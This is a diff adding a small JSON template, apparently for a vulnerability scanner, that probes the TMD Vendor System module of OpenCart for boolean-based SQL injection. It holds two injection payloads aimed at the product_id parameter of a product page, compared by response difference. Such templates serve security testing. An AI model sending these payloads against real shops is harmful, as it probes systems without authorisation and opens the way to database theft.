@@ -1,0 +1,15 @@
+{
+ "id": "opencart-tmd-vendor",
+ "engine": "opencart",
+ "path": "/index.php?route=product/product&product_id={{p}}",
+ "payloads": [
+  "1' AND 1=1-- -",
+  "1' AND 1=0-- -"
+ ],
+ "match": {
+  "type": "bool"
+ },
+ "score": 6,
+ "note": "TMD Vendor System, булева по разнице ответа",
+ "method": "GET"
+}
